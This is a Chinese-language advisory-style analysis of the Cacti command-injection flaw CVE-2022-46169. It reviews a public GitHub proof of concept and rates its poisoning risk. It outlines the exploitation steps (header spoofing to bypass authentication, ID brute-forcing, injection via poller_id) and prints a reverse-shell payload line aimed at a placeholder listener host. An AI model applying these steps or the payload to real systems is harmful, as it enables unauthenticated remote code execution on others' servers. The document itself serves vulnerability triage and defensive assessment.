## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在`POLLER_ACTION_SCRIPT_PHP`类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 HTTP 头 `X-Forwarded-For` 绕过身份验证，并利用 `remote_agent.php` 脚本中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过:** 通过设置 `X-Forwarded-For` 头为 Cacti 服务器的 IP 地址，欺骗 `get_client_addr` 函数，绕过身份验证。
2.  **查找可利用的 poller_item:**  通过暴力破解 `host_id` 和 `local_data_id`，找到 `action` 为 `POLLER_ACTION_SCRIPT_PHP` (值为 2)的 `poller_item`。
3.  **命令注入:** 将恶意命令注入到 `poller_id` 参数中，通过 `proc_open` 函数执行。

**POC代码分析：**

*   `cacti_exploit.py` 脚本自动化了漏洞利用过程。
*   首先尝试访问 `/remote_agent.php?action=polldata` 或 `/cacti/remote_agent.php?action=polldata` 来确定正确的URL。
*   然后，脚本使用 `X-Forwarded-For` 头绕过身份验证。
*   接下来，脚本暴力破解 `host_id` 和 `local_data_ids` 来寻找合适的 `poller_item`。
*   最后，脚本构造包含反向 shell 命令的 URL，并发送请求来利用命令注入漏洞。

**有效性：**

根据漏洞描述、搜索结果以及提供的 POC 代码，此漏洞是有效的。搜索结果表明该漏洞已被积极利用。

**投毒风险：**

虽然该脚本的主要目的是利用 CVE-2022-46169 漏洞，但存在轻微的投毒风险。具体体现在：

*   **硬编码参数:** 脚本中存在一些硬编码的参数，例如 `poller_id=1`，`host_id=1`，`local_data_ids[]=1`, `words = ["cpu","cmd.php","polling_time","apache"]`。这些值在不同的 Cacti 部署中可能不同，如果用户不加修改直接使用，可能导致利用失败。这可以被视为一种隐蔽的“陷阱”，虽然不是恶意的后门，但也可能误导用户。
*   **反向Shell Payload:** 用户如果直接使用payload `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`需要确保目标机器上存在sh.如果没有可能需要更换payload.如果不熟悉的用户可能利用失败.
*   **依赖第三方库:** 脚本依赖 `requests` 和 `urllib3` 库。如果用户从不可信的源安装这些库，可能会引入恶意代码。

尽管如此，该脚本没有发现明显的恶意代码（如删除文件、上传恶意文件等），因此投毒的概率较低，约为5%。主要风险在于使用不当或未能正确配置脚本导致利用失败。


**项目地址:** [N1arut/CVE-2022-46169_POC](https://github.com/N1arut/CVE-2022-46169_POC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)